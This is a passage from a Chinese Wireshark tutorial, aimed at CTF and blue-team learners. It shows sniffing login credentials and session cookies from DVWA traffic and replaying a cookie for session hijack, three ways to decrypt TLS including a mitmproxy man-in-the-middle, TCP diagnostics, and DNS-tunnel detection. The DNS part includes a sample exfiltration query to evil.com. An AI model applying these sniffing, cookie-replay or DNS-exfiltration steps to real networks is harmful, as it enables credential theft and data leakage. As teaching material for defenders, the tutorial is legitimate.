  <rect x="0" y="0" width="1080" height="64" fill="url(#g1s17)" opacity="0.3"/>
  <rect x="0" y="0" width="1080" height="2" fill="url(#g1s17)"/>
  <rect x="0" y="60" width="1080" height="2" fill="#1e293b"/>  <text x="540" y="36" text-anchor="middle" font-size="20" font-weight="800" fill="#f1f5f9" font-family="Microsoft YaHei,Arial" filter="url(#shs17)">图 5-17 实战 1：HTTP 流量抓取 + 敏感信息提取 8 步（CTF/蓝队入门必练）</text>  <text x="540" y="56" text-anchor="middle" font-size="12" fill="#94a3b8" font-family="Microsoft YaHei,Arial">场景=模拟抓黑客访问受害者登录接口 → 从流量里还原账号密码/token/后台地址 → 全程 8 步=跟着做一遍就会</text>  <rect x="30" y="100" width="250" height="205" rx="14" fill="#0b1530" stroke="#0ea5e9"/>  <text x="155" y="118" text-anchor="middle" font-size="14" font-weight="900" fill="#fff" font-family="Arial"><tspan fill="#0ea5e9">1</tspan></text>  <text x="185" y="118" font-size="11" font-weight="800" fill="#0ea5e9" font-family="Microsoft YaHei,Arial">Step1 准备环境</text>  <text x="44" y="148" font-size="9.4" fill="#e2e8f0" font-family="Consolas,Microsoft YaHei,Arial">Kali: sudo wireshark\nWindows: Npcap + 管理员启动\nVictim: DVWA/login.php</text>  <rect x="290" y="100" width="250" height="205" rx="14" fill="#0b1530" stroke="#10b981"/>  <text x="415" y="118" text-anchor="middle" font-size="14" font-weight="900" fill="#fff" font-family="Arial"><tspan fill="#10b981">2</tspan></text>  <text x="445" y="118" font-size="11" font-weight="800" fill="#10b981" font-family="Microsoft YaHei,Arial">Step2 选网卡 + 捕获过滤器</text>  <text x="304" y="148" font-size="9.4" fill="#e2e8f0" font-family="Consolas,Microsoft YaHei,Arial">网卡=桥接 eth0 (和目标同段)\nBPF=tcp port 80 and host 192.168.1.100\n双击网卡开始抓</text>  <rect x="550" y="100" width="250" height="205" rx="14" fill="#0b1530" stroke="#8b5cf6"/>  <text x="675" y="118" text-anchor="middle" font-size="14" font-weight="900" fill="#fff" font-family="Arial"><tspan fill="#8b5cf6">3</tspan></text>  <text x="705" y="118" font-size="11" font-weight="800" fill="#8b5cf6" font-family="Microsoft YaHei,Arial">Step3 触发登录行为</text>  <text x="564" y="148" font-size="9.4" fill="#e2e8f0" font-family="Consolas,Microsoft YaHei,Arial">curl http://192.168.1.100/DVWA/login.php\ndata: username=admin password=password\n或者浏览器手动操作</text>  <rect x="810" y="100" width="250" height="205" rx="14" fill="#0b1530" stroke="#a855f7"/>  <text x="935" y="118" text-anchor="middle" font-size="14" font-weight="900" fill="#fff" font-family="Arial"><tspan fill="#a855f7">4</tspan></text>  <text x="965" y="118" font-size="11" font-weight="800" fill="#a855f7" font-family="Microsoft YaHei,Arial">Step4 停止抓包 Ctrl+E</text>  <text x="824" y="148" font-size="9.4" fill="#e2e8f0" font-family="Consolas,Microsoft YaHei,Arial">右上角 Stop=红色方形按钮\nFile → Save As=DVWA_login.pcap\n默认保存路径=文档/Wireshark/</text>  <rect x="30" y="315" width="250" height="205" rx="14" fill="#0b1530" stroke="#ec4899"/>  <text x="155" y="333" text-anchor="middle" font-size="14" font-weight="900" fill="#fff" font-family="Arial"><tspan fill="#ec4899">5</tspan></text>  <text x="185" y="333" font-size="11" font-weight="800" fill="#ec4899" font-family="Microsoft YaHei,Arial">Step5 显示过滤器=POST</text>  <text x="44" y="363" font-size="9.4" fill="#e2e8f0" font-family="Consolas,Microsoft YaHei,Arial">http.request.method == POST\n或 http.request.uri contains login\n按回车 → 立刻定位关键包</text>  <rect x="290" y="315" width="250" height="205" rx="14" fill="#0b1530" stroke="#ef4444"/>  <text x="415" y="333" text-anchor="middle" font-size="14" font-weight="900" fill="#fff" font-family="Arial"><tspan fill="#ef4444">6</tspan></text>  <text x="445" y="333" font-size="11" font-weight="800" fill="#ef4444" font-family="Microsoft YaHei,Arial">Step6 Follow TCP Stream</text>  <text x="304" y="363" font-size="9.4" fill="#e2e8f0" font-family="Consolas,Microsoft YaHei,Arial">右键该包 Follow → TCP Stream\n立刻看到: POST /DVWA/login.php\n表单: username=admin&amp;password=password</text>  <rect x="550" y="315" width="250" height="205" rx="14" fill="#0b1530" stroke="#f59e0b"/>  <text x="675" y="333" text-anchor="middle" font-size="14" font-weight="900" fill="#fff" font-family="Arial"><tspan fill="#f59e0b">7</tspan></text>  <text x="705" y="333" font-size="11" font-weight="800" fill="#f59e0b" font-family="Microsoft YaHei,Arial">Step7 导出 HTTP 对象 + Cookie</text>  <text x="564" y="363" font-size="9.4" fill="#e2e8f0" font-family="Consolas,Microsoft YaHei,Arial">File → Export Objects → HTTP\n选中 login.html 保存 → 下载\n展开 Headers → Cookie: PHPSESSID=...</text>  <rect x="810" y="315" width="250" height="205" rx="14" fill="#0b1530" stroke="#06b6d4"/>  <text x="935" y="333" text-anchor="middle" font-size="14" font-weight="900" fill="#fff" font-family="Arial"><tspan fill="#06b6d4">8</tspan></text>  <text x="965" y="333" font-size="11" font-weight="800" fill="#06b6d4" font-family="Microsoft YaHei,Arial">Step8 写成报告 / 复现漏洞</text>  <text x="824" y="363" font-size="9.4" fill="#e2e8f0" font-family="Consolas,Microsoft YaHei,Arial">整理 URL/账号/令牌/Cookie\n用浏览器复制 Cookie → 直接登录\n完成=账号盗取/会话劫持复现</text>  <rect x="30" y="535" width="1020" height="24" rx="8" fill="#020617" stroke="#1e293b"/>
  <text x="540" y="551" text-anchor="middle" font-size="11" fill="#93c5fd" font-family="Microsoft YaHei,Arial">新手最容易踩坑：Step5 之前没加 host=目标IP=抓了一堆乱七八糟的包 → 显示过滤器里也搜不到 → BPF 一定要写 host</text>
</svg>
```


### 场景说明

分析HTTP请求，找出登录请求和响应。

### 步骤

**步骤1：捕获HTTP流量**

设置捕获过滤器：`port 80`

**步骤2：显示HTTP请求**

显示过滤器：`http.request.method == "POST"`

**步骤3：找到登录请求**

显示过滤器：`http.request.uri contains "login"`

**步骤4：追踪HTTP流**

右键登录请求 → "Follow" → "HTTP Stream"

查看完整的请求和响应：
```
POST /login HTTP/1.1
Host: target.example.com
Content-Type: application/x-www-form-urlencoded

username=admin&password=admin123

HTTP/1.1 302 Found
Location: /dashboard
Set-Cookie: session=abc123
```

---

## 5.13 实战案例：HTTPS解密分析

```svg
<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 1080 570" width="1080" height="570" style="max-width:100%;background:linear-gradient(180deg,#020617 0%,#0f172a 100%);border-radius:14px;border:1px solid #1e293b">
  <defs>
    <linearGradient id="g1s18" x1="0" x2="1" y1="0" y2="0"><stop offset="0" stop-color="#6366f1"/><stop offset="1" stop-color="#06b6d4"/></linearGradient>
    <linearGradient id="g2s18" x1="0" x2="0" y1="0" y2="1"><stop offset="0" stop-color="#1e293b"/><stop offset="1" stop-color="#020617"/></linearGradient>
    <marker id="arrs18" viewBox="0 0 10 10" refX="9" refY="5" markerWidth="7" markerHeight="7" orient="auto-start-reverse"><path d="M 0 0 L 10 5 L 0 10 z" fill="#60a5fa"/></marker>
    <filter id="shs18"><feDropShadow dx="0" dy="2" stdDeviation="3" flood-color="#000" flood-opacity="0.55"/></filter>
  </defs>
  <rect x="0" y="0" width="1080" height="64" fill="url(#g1s18)" opacity="0.3"/>
  <rect x="0" y="0" width="1080" height="2" fill="url(#g1s18)"/>
  <rect x="0" y="60" width="1080" height="2" fill="#1e293b"/>  <text x="540" y="36" text-anchor="middle" font-size="20" font-weight="800" fill="#f1f5f9" font-family="Microsoft YaHei,Arial" filter="url(#shs18)">图 5-18 实战 2：HTTPS TLS 解密 3 种方法（SSLKEYLOGFILE/RSA 私钥/mitmproxy 中间人）</text>  <text x="540" y="56" text-anchor="middle" font-size="12" fill="#94a3b8" font-family="Microsoft YaHei,Arial">TLS 1.3 前还能用 RSA 私钥解密，TLS 1.3 全部 PFS 前向安全 → 只能用 SSLKEYLOGFILE 浏览器导出会话密钥！mitmproxy=服务器证书未知场景通用</text>  <rect x="30" y="100" width="335" height="410" rx="14" fill="#0b1530" stroke="#0ea5e9"/>  <rect x="30" y="100" width="335" height="44" rx="14" fill="#0ea5e9" opacity="0.2"/>  <text x="198" y="120" text-anchor="middle" font-size="11.5" font-weight="800" fill="#0ea5e9" font-family="Microsoft YaHei,Arial">① SSLKEYLOGFILE法</text>  <text x="198" y="138" text-anchor="middle" font-size="10.5" font-weight="800" fill="#0ea5e9" font-family="Microsoft YaHei,Arial">推荐·通用·TLS 1.3 支持</text>  <text x="42" y="156.0" font-size="9" fill="#e2e8f0" font-family="Consolas,Microsoft YaHei,Arial">步骤5条:</text>  <text x="42" y="173.5" font-size="9" fill="#e2e8f0" font-family="Consolas,Microsoft YaHei,Arial">1. setx SSLKEYLOGFILE C:\ssl_keylog.log(永久)</text>  <text x="42" y="191.0" font-size="9" fill="#e2e8f0" font-family="Consolas,Microsoft YaHei,Arial">2. 重启 Chrome/Edge(=环境变量生效)</text>  <text x="42" y="208.5" font-size="9" fill="#e2e8f0" font-family="Consolas,Microsoft YaHei,Arial">3. 访问目标 HTTPS 网站=自动写 key log</text>  <text x="42" y="226.0" font-size="9" fill="#e2e8f0" font-family="Consolas,Microsoft YaHei,Arial">4. Wireshark: Edit→Preferences→Protocols→TLS</text>  <text x="42" y="243.5" font-size="9" fill="#e2e8f0" font-family="Consolas,Microsoft YaHei,Arial">5. (Pre)-Master-Secret log filename=C:\ssl_key</text>  <text x="42" y="261.0" font-size="9" fill="#e2e8f0" font-family="Consolas,Microsoft YaHei,Arial">✅ 结果:原本 TLS Application Data→自动解密成 HTTP/2 明文</text>  <text x="42" y="278.5" font-size="9" fill="#e2e8f0" font-family="Consolas,Microsoft YaHei,Arial">Filter: http2/decrypted</text>  <rect x="375" y="100" width="335" height="410" rx="14" fill="#0b1530" stroke="#10b981"/>  <rect x="375" y="100" width="335" height="44" rx="14" fill="#10b981" opacity="0.2"/>  <text x="543" y="120" text-anchor="middle" font-size="11.5" font-weight="800" fill="#10b981" font-family="Microsoft YaHei,Arial">② RSA 私钥法</text>  <text x="543" y="138" text-anchor="middle" font-size="10.5" font-weight="800" fill="#10b981" font-family="Microsoft YaHei,Arial">仅老服务器/TLS 1.2 非ECDHE</text>  <text x="387" y="156.0" font-size="9" fill="#e2e8f0" font-family="Consolas,Microsoft YaHei,Arial">步骤4条:</text>  <text x="387" y="173.5" font-size="9" fill="#e2e8f0" font-family="Consolas,Microsoft YaHei,Arial">1. 拿到服务器私钥 server.key / server.pem</text>  <text x="387" y="191.0" font-size="9" fill="#e2e8f0" font-family="Consolas,Microsoft YaHei,Arial">2. Wireshark: Edit→Preferences→Protocols→TLS</text>  <text x="387" y="208.5" font-size="9" fill="#e2e8f0" font-family="Consolas,Microsoft YaHei,Arial">3. RSA keys list → Edit → Add New:</text>  <text x="387" y="226.0" font-size="9" fill="#e2e8f0" font-family="Consolas,Microsoft YaHei,Arial">   IP=服务器 IP Port=443 Protocol=http Key=server</text>  <text x="387" y="243.5" font-size="9" fill="#e2e8f0" font-family="Consolas,Microsoft YaHei,Arial">4. 打开 pcap=自动解密</text>  <text x="387" y="261.0" font-size="9" fill="#e2e8f0" font-family="Consolas,Microsoft YaHei,Arial">⚠️ 不支持 TLS 1.3 + ECDHE cipher (前向安全 PFS)</text>  <text x="387" y="278.5" font-size="9" fill="#e2e8f0" font-family="Consolas,Microsoft YaHei,Arial">   Cipher=ECDHE 时会灰飞烟灭=必须用方法①</text>  <rect x="720" y="100" width="335" height="410" rx="14" fill="#0b1530" stroke="#8b5cf6"/>  <rect x="720" y="100" width="335" height="44" rx="14" fill="#8b5cf6" opacity="0.2"/>  <text x="888" y="120" text-anchor="middle" font-size="11.5" font-weight="800" fill="#8b5cf6" font-family="Microsoft YaHei,Arial">③ mitmproxy 中间人法</text>  <text x="888" y="138" text-anchor="middle" font-size="10.5" font-weight="800" fill="#8b5cf6" font-family="Microsoft YaHei,Arial">服务器私钥拿不到=主动代理解密</text>  <text x="732" y="156.0" font-size="9" fill="#e2e8f0" font-family="Consolas,Microsoft YaHei,Arial">步骤5条:</text>  <text x="732" y="173.5" font-size="9" fill="#e2e8f0" font-family="Consolas,Microsoft YaHei,Arial">1. pip install mitmproxy → mitmproxy --mode re</text>  <text x="732" y="191.0" font-size="9" fill="#e2e8f0" font-family="Consolas,Microsoft YaHei,Arial">2. 浏览器 Proxy=127.0.0.1:8080</text>  <text x="732" y="208.5" font-size="9" fill="#e2e8f0" font-family="Consolas,Microsoft YaHei,Arial">3. 安装 mitmproxy-ca-cert.p12 (受信任根证书)</text>  <text x="732" y="226.0" font-size="9" fill="#e2e8f0" font-family="Consolas,Microsoft YaHei,Arial">4. mitmdump -w mitm.pcap  → 代理+抓包+存 pcap</text>  <text x="732" y="243.5" font-size="9" fill="#e2e8f0" font-family="Consolas,Microsoft YaHei,Arial">5. 用 Wireshark 打开 mitm.pcap 看=全部明文 HTTP</text>  <text x="732" y="261.0" font-size="9" fill="#e2e8f0" font-family="Consolas,Microsoft YaHei,Arial">✅ 通用=不管什么版本 TLS/都能解=渗透测试神器</text>  <text x="732" y="278.5" font-size="9" fill="#e2e8f0" font-family="Consolas,Microsoft YaHei,Arial">⚠️ 必须能装 CA=目标 PC 必须受你控制</text>  <rect x="30" y="520" width="1020" height="30" rx="6" fill="#020617" stroke="#a855f7"/>  <text x="540" y="540" text-anchor="middle" font-size="11" fill="#c4b5fd" font-family="Consolas,Microsoft YaHei,Arial">✅ 解密成功 3 种标志: ① Decrypted TLS (521) 标签 ② Follow Stream 直接显示 HTTP 明文 ③ tls.app_data 变成 http/2.headers+data</text>
</svg>
```


### HTTPS加密原理

HTTPS使用TLS/SSL加密，流量内容是加密的。

### 解密HTTPS

**方法：使用SSLKEYLOGFILE**

某些浏览器支持导出SSL密钥：

1. 设置环境变量：
   ```bash
   export SSLKEYLOGFILE=/tmp/ssl_keys.log
   ```

2. 启动浏览器：
   ```bash
   firefox
   ```

3. Wireshark配置：
   - 点击"Edit" → "Preferences" → "Protocols" → "TLS"
   - 设置"(Pre)-Master-Secret log filename"为密钥文件路径

4. 重新捕获HTTPS流量，可以看到解密后的内容。

---

## 5.14 实战案例：TCP会话重建

```svg
<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 1080 570" width="1080" height="570" style="max-width:100%;background:linear-gradient(180deg,#020617 0%,#0f172a 100%);border-radius:14px;border:1px solid #1e293b">
  <defs>
    <linearGradient id="g1s19" x1="0" x2="1" y1="0" y2="0"><stop offset="0" stop-color="#6366f1"/><stop offset="1" stop-color="#06b6d4"/></linearGradient>
    <linearGradient id="g2s19" x1="0" x2="0" y1="0" y2="1"><stop offset="0" stop-color="#1e293b"/><stop offset="1" stop-color="#020617"/></linearGradient>
    <marker id="arrs19" viewBox="0 0 10 10" refX="9" refY="5" markerWidth="7" markerHeight="7" orient="auto-start-reverse"><path d="M 0 0 L 10 5 L 0 10 z" fill="#60a5fa"/></marker>
    <filter id="shs19"><feDropShadow dx="0" dy="2" stdDeviation="3" flood-color="#000" flood-opacity="0.55"/></filter>
  </defs>
  <rect x="0" y="0" width="1080" height="64" fill="url(#g1s19)" opacity="0.3"/>
  <rect x="0" y="0" width="1080" height="2" fill="url(#g1s19)"/>
  <rect x="0" y="60" width="1080" height="2" fill="#1e293b"/>  <text x="540" y="36" text-anchor="middle" font-size="20" font-weight="800" fill="#f1f5f9" font-family="Microsoft YaHei,Arial" filter="url(#shs19)">图 5-19 实战 3：TCP 会话重建 + 网络故障诊断（重传/丢包/Zero Window）</text>  <text x="540" y="56" text-anchor="middle" font-size="12" fill="#94a3b8" font-family="Microsoft YaHei,Arial">常见网络故障: 网速慢/SSH 卡/视频卡=90% 都是 TCP 问题；TCP 分析三剑客=SEQ/ACK 图 + I/O Graph + Expert Info 告警</text>  <rect x="30" y="100" width="505" height="210" rx="12" fill="#0b1530" stroke="#ef4444"/>  <rect x="30" y="100" width="505" height="40" rx="12" fill="#ef4444" opacity="0.18"/>  <text x="283" y="125" text-anchor="middle" font-size="12" font-weight="800" fill="#ef4444" font-family="Microsoft YaHei,Arial">① Retransmission 重传</text>  <text x="46" y="150" font-size="9.6" fill="#e2e8f0" font-family="Consolas,Microsoft YaHei,Arial">诊断步骤:</text>  <text x="46" y="168" font-size="9.6" fill="#e2e8f0" font-family="Consolas,Microsoft YaHei,Arial">1. 过滤器: tcp.analysis.retransmission</text>  <text x="46" y="186" font-size="9.6" fill="#e2e8f0" font-family="Consolas,Microsoft YaHei,Arial">2. 看 Expert Info Warning=红色</text>  <text x="46" y="204" font-size="9.6" fill="#e2e8f0" font-family="Consolas,Microsoft YaHei,Arial">3. 抓了 10000 包 重传&gt;100 个=链路有问题</text>  <text x="46" y="222" font-size="9.6" fill="#e2e8f0" font-family="Consolas,Microsoft YaHei,Arial">4. 原因:物理链路丢包/MTU 太大/对端负载太高</text>  <text x="46" y="240" font-size="9.6" fill="#e2e8f0" font-family="Consolas,Microsoft YaHei,Arial">修复: ping -f 测丢包率 / traceroute 查哪段 / MTU=1400</text>  <rect x="545" y="100" width="505" height="210" rx="12" fill="#0b1530" stroke="#f59e0b"/>  <rect x="545" y="100" width="505" height="40" rx="12" fill="#f59e0b" opacity="0.18"/>  <text x="798" y="125" text-anchor="middle" font-size="12" font-weight="800" fill="#f59e0b" font-family="Microsoft YaHei,Arial">② Duplicate ACK 重复确认</text>  <text x="561" y="150" font-size="9.6" fill="#e2e8f0" font-family="Consolas,Microsoft YaHei,Arial">诊断步骤:</text>  <text x="561" y="168" font-size="9.6" fill="#e2e8f0" font-family="Consolas,Microsoft YaHei,Arial">1. 过滤器: tcp.analysis.duplicate_ack</text>  <text x="561" y="186" font-size="9.6" fill="#e2e8f0" font-family="Consolas,Microsoft YaHei,Arial">2. 连续 3 个 DupACK=触发 Fast Retransmission</text>  <text x="561" y="204" font-size="9.6" fill="#e2e8f0" font-family="Consolas,Microsoft YaHei,Arial">3. 对端收包乱序=跳号了</text>  <text x="561" y="222" font-size="9.6" fill="#e2e8f0" font-family="Consolas,Microsoft YaHei,Arial">4. 原因:负载均衡/多路径/中间设备 QoS</text>  <text x="561" y="240" font-size="9.6" fill="#e2e8f0" font-family="Consolas,Microsoft YaHei,Arial">修复: 检查防火墙 IPS/开启 TCP SACK/检查网卡 RSS</text>  <rect x="30" y="320" width="505" height="210" rx="12" fill="#0b1530" stroke="#ec4899"/>  <rect x="30" y="320" width="505" height="40" rx="12" fill="#ec4899" opacity="0.18"/>  <text x="283" y="345" text-anchor="middle" font-size="12" font-weight="800" fill="#ec4899" font-family="Microsoft YaHei,Arial">③ Zero Window 零窗口</text>  <text x="46" y="370" font-size="9.6" fill="#e2e8f0" font-family="Consolas,Microsoft YaHei,Arial">诊断步骤:</text>  <text x="46" y="388" font-size="9.6" fill="#e2e8f0" font-family="Consolas,Microsoft YaHei,Arial">1. 过滤器: tcp.window_size_value == 0</text>  <text x="46" y="406" font-size="9.6" fill="#e2e8f0" font-family="Consolas,Microsoft YaHei,Arial">2. 出现=对端接缓冲满了=读不过来=不能再发数据</text>  <text x="46" y="424" font-size="9.6" fill="#e2e8f0" font-family="Consolas,Microsoft YaHei,Arial">3. 典型=服务器 CPU/内存跑满=处理不过来</text>  <text x="46" y="442" font-size="9.6" fill="#e2e8f0" font-family="Consolas,Microsoft YaHei,Arial">修复: 提升服务器配置/调优 tcp_rmem/tcp_wmem/CDN 缓存</text>  <rect x="545" y="320" width="505" height="210" rx="12" fill="#0b1530" stroke="#a855f7"/>  <rect x="545" y="320" width="505" height="40" rx="12" fill="#a855f7" opacity="0.18"/>  <text x="798" y="345" text-anchor="middle" font-size="12" font-weight="800" fill="#a855f7" font-family="Microsoft YaHei,Arial">④ RTT 超时+抖动大</text>  <text x="561" y="370" font-size="9.6" fill="#e2e8f0" font-family="Consolas,Microsoft YaHei,Arial">诊断步骤:</text>  <text x="561" y="388" font-size="9.6" fill="#e2e8f0" font-family="Consolas,Microsoft YaHei,Arial">1. Statistics → I/O Graph: Y 轴=TCP RTT</text>  <text x="561" y="406" font-size="9.6" fill="#e2e8f0" font-family="Consolas,Microsoft YaHei,Arial">2. 平均 RTT&gt;200ms 抖动&gt;100ms=卡到爆</text>  <text x="561" y="424" font-size="9.6" fill="#e2e8f0" font-family="Consolas,Microsoft YaHei,Arial">3. tcp.analysis.ack_rtt&gt;1=单次响应慢</text>  <text x="561" y="442" font-size="9.6" fill="#e2e8f0" font-family="Consolas,Microsoft YaHei,Arial">修复: CDN 就近/专线/SD-WAN/缩短物理距离/QUIC 替代 TCP</text>  <rect x="30" y="520" width="1020" height="30" rx="6" fill="#020617" stroke="#6366f1"/>  <text x="540" y="540" text-anchor="middle" font-size="11" fill="#bfdbfe" font-family="Microsoft YaHei,Arial">如何看 TCP 时序图: Statistics → Flow Graph → TCP Flows；X=时间 Y=包号/SEQ 上升斜线=正常 水平线=丢包 跳斜线=重传</text>
</svg>
```


### 场景说明

分析TCP连接过程，理解三次握手和四次挥手。

### 三次握手分析

**过滤器：** `tcp.flags.syn == 1 or tcp.flags.ack == 1`

你会看到：
```
1. SYN      客户端 → 服务器    seq=x
2. SYN+ACK  服务器 → 客户端    seq=y, ack=x+1
3. ACK      客户端 → 服务器    seq=x+1, ack=y+1
```

### 四次挥手分析

**过滤器：** `tcp.flags.fin == 1`

你会看到：
```
1. FIN      客户端 → 服务器
2. ACK      服务器 → 客户端
3. FIN      服务器 → 客户端
4. ACK      客户端 → 服务器
```

---

## 5.15 实战案例：DNS流量分析

```svg
<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 1080 570" width="1080" height="570" style="max-width:100%;background:linear-gradient(180deg,#020617 0%,#0f172a 100%);border-radius:14px;border:1px solid #1e293b">
  <defs>
    <linearGradient id="g1s20" x1="0" x2="1" y1="0" y2="0"><stop offset="0" stop-color="#6366f1"/><stop offset="1" stop-color="#06b6d4"/></linearGradient>
    <linearGradient id="g2s20" x1="0" x2="0" y1="0" y2="1"><stop offset="0" stop-color="#1e293b"/><stop offset="1" stop-color="#020617"/></linearGradient>
    <marker id="arrs20" viewBox="0 0 10 10" refX="9" refY="5" markerWidth="7" markerHeight="7" orient="auto-start-reverse"><path d="M 0 0 L 10 5 L 0 10 z" fill="#60a5fa"/></marker>
    <filter id="shs20"><feDropShadow dx="0" dy="2" stdDeviation="3" flood-color="#000" flood-opacity="0.55"/></filter>
  </defs>
  <rect x="0" y="0" width="1080" height="64" fill="url(#g1s20)" opacity="0.3"/>
  <rect x="0" y="0" width="1080" height="2" fill="url(#g1s20)"/>
  <rect x="0" y="60" width="1080" height="2" fill="#1e293b"/>  <text x="540" y="36" text-anchor="middle" font-size="20" font-weight="800" fill="#f1f5f9" font-family="Microsoft YaHei,Arial" filter="url(#shs20)">图 5-20 实战 4：DNS 隧道检测 + DNS 数据外泄识别 6 个异常特征</text>  <text x="540" y="56" text-anchor="middle" font-size="12" fill="#94a3b8" font-family="Microsoft YaHei,Arial">DNS 隧道=黑客最爱的隐蔽通讯=用 DNS 查询把数据带出内网=防火墙 99% 放行 DNS；识别 DNS 异常=蓝队 Hvv 必掌握技能</text>  <rect x="30" y="100" width="335" height="210" rx="12" fill="#0b1530" stroke="#ef4444"/>  <rect x="30" y="100" width="335" height="38" rx="12" fill="#ef4444" opacity="0.18"/>  <text x="198" y="124" text-anchor="middle" font-size="11" font-weight="800" fill="#ef4444" font-family="Microsoft YaHei,Arial">① 超长 QNAME&gt;30 字符</text>  <text x="40" y="148" font-size="8.8" fill="#e2e8f0" font-family="Consolas,Microsoft YaHei,Arial">正常 www.baidu.com=13 字符</text>  <text x="40" y="165" font-size="8.8" fill="#e2e8f0" font-family="Consolas,Microsoft YaHei,Arial">黑客 dGhpcyBpcyBiYXNlNjQgZXhmaWw.example.com=bas</text>  <text x="40" y="182" font-size="8.8" fill="#e2e8f0" font-family="Consolas,Microsoft YaHei,Arial">过滤器: dns.qry.name matches '^[a-z0-9]{30,}\.'</text>  <text x="40" y="199" font-size="8.8" fill="#e2e8f0" font-family="Consolas,Microsoft YaHei,Arial">应对: IDS 阈值=QNAME &gt;30=告警</text>  <rect x="375" y="100" width="335" height="210" rx="12" fill="#0b1530" stroke="#f59e0b"/>  <rect x="375" y="100" width="335" height="38" rx="12" fill="#f59e0b" opacity="0.18"/>  <text x="543" y="124" text-anchor="middle" font-size="11" font-weight="800" fill="#f59e0b" font-family="Microsoft YaHei,Arial">② TXT 记录高频查询</text>  <text x="385" y="148" font-size="8.8" fill="#e2e8f0" font-family="Consolas,Microsoft YaHei,Arial">正常 MX/TXT=收邮件 SPF/DKIM=非常低频</text>  <text x="385" y="165" font-size="8.8" fill="#e2e8f0" font-family="Consolas,Microsoft YaHei,Arial">黑客: nslookup -type=TXT data123456.evil.com</text>  <text x="385" y="182" font-size="8.8" fill="#e2e8f0" font-family="Consolas,Microsoft YaHei,Arial">把数据塞 TXT 记录回复里=从服务器拉命令</text>  <text x="385" y="199" font-size="8.8" fill="#e2e8f0" font-family="Consolas,Microsoft YaHei,Arial">过滤器: dns.qry.type == 16 &amp;&amp; count&gt;10/分钟</text>  <text x="385" y="216" font-size="8.8" fill="#e2e8f0" font-family="Consolas,Microsoft YaHei,Arial">应对: 内网 DNS 禁止外网 TXT 默认 deny</text>  <rect x="720" y="100" width="335" height="210" rx="12" fill="#0b1530" stroke="#ec4899"/>  <rect x="720" y="100" width="335" height="38" rx="12" fill="#ec4899" opacity="0.18"/>  <text x="888" y="124" text-anchor="middle" font-size="11" font-weight="800" fill="#ec4899" font-family="Microsoft YaHei,Arial">③ 极短 TTL+Fast-Flux</text>  <text x="730" y="148" font-size="8.8" fill="#e2e8f0" font-family="Consolas,Microsoft YaHei,Arial">正常网站 TTL=300s~3600s=几小时</text>  <text x="730" y="165" font-size="8.8" fill="#e2e8f0" font-family="Consolas,Microsoft YaHei,Arial">黑客 C2=TTL&lt;30 秒=每 30 秒换一个 IP=抗封禁</text>  <text x="730" y="182" font-size="8.8" fill="#e2e8f0" font-family="Consolas,Microsoft YaHei,Arial">Fast-Flux=NS/IP 几百个 IP 轮巡=CC 保护</text>  <text x="730" y="199" font-size="8.8" fill="#e2e8f0" font-family="Consolas,Microsoft YaHei,Arial">过滤器: dns.resp.ttl &lt; 60</text>  <text x="730" y="216" font-size="8.8" fill="#e2e8f0" font-family="Consolas,Microsoft YaHei,Arial">应对: 信誉库+威胁情报匹配=命中=阻断</text>  <rect x="30" y="320" width="335" height="210" rx="12" fill="#0b1530" stroke="#8b5cf6"/>  <rect x="30" y="320" width="335" height="38" rx="12" fill="#8b5cf6" opacity="0.18"/>  <text x="198" y="344" text-anchor="middle" font-size="11" font-weight="800" fill="#8b5cf6" font-family="Microsoft YaHei,Arial">④ NXDOMAIN 爆发</text>  <text x="40" y="368" font-size="8.8" fill="#e2e8f0" font-family="Consolas,Microsoft YaHei,Arial">正常 1 分钟 0~5 个 NXDOMAIN=手输错域名</text>  <text x="40" y="385" font-size="8.8" fill="#e2e8f0" font-family="Consolas,Microsoft YaHei,Arial">黑客 DGAs 算法生成 100 个域名试哪个被注册=1 分钟 NXDOMAIN&gt;100=病</text>  <text x="40" y="402" font-size="8.8" fill="#e2e8f0" font-family="Consolas,Microsoft YaHei,Arial">过滤器: dns.flags.rcode == 3 + time window</text>  <text x="40" y="419" font-size="8.8" fill="#e2e8f0" font-family="Consolas,Microsoft YaHei,Arial">应对: EDR 检测 DGAs=Windows DNS 日志收集</text>  <rect x="375" y="320" width="335" height="210" rx="12" fill="#0b1530" stroke="#a855f7"/>  <rect x="375" y="320" width="335" height="38" rx="12" fill="#a855f7" opacity="0.18"/>  <text x="543" y="344" text-anchor="middle" font-size="11" font-weight="800" fill="#a855f7" font-family="Microsoft YaHei,Arial">⑤ 子域名熵值极高</text>  <text x="385" y="368" font-size="8.8" fill="#e2e8f0" font-family="Consolas,Microsoft YaHei,Arial">正常 baidu.com/qq.com=英文词=低熵 Shannon&lt;3</text>  <text x="385" y="385" font-size="8.8" fill="#e2e8f0" font-family="Consolas,Microsoft YaHei,Arial">随机 base64/hash=熵值&gt;4=一眼区分</text>  <text x="385" y="402" font-size="8.8" fill="#e2e8f0" font-family="Consolas,Microsoft YaHei,Arial">Entropy=math.log2(k)*freq 算字符分布</text>  <text x="385" y="419" font-size="8.8" fill="#e2e8f0" font-family="Consolas,Microsoft YaHei,Arial">应对: 离线 pcap 熵值分析 / Suricata 规则匹配</text>  <rect x="720" y="320" width="335" height="210" rx="12" fill="#0b1530" stroke="#06b6d4"/>  <rect x="720" y="320" width="335" height="38" rx="12" fill="#06b6d4" opacity="0.18"/>  <text x="888" y="344" text-anchor="middle" font-size="11" font-weight="800" fill="#06b6d4" font-family="Microsoft YaHei,Arial">⑥ 解析出非 A/AAAA</text>  <text x="730" y="368" font-size="8.8" fill="#e2e8f0" font-family="Consolas,Microsoft YaHei,Arial">正常 DNS=95% A/AAAA=IP 地址</text>  <text x="730" y="385" font-size="8.8" fill="#e2e8f0" font-family="Consolas,Microsoft YaHei,Arial">黑客: DNS CNAME 链跳 10+ 层=混淆真实 C2</text>  <text x="730" y="402" font-size="8.8" fill="#e2e8f0" font-family="Consolas,Microsoft YaHei,Arial">SVCB/HTTPS 新类型=DoH/DoT 新协议 偷偷传输</text>  <text x="730" y="419" font-size="8.8" fill="#e2e8f0" font-family="Consolas,Microsoft YaHei,Arial">应对: 内网 DNS 白名单=只放行常用类型=拒 ALL</text>  <rect x="30" y="540" width="1020" height="24" rx="8" fill="#020617" stroke="#1e293b"/>
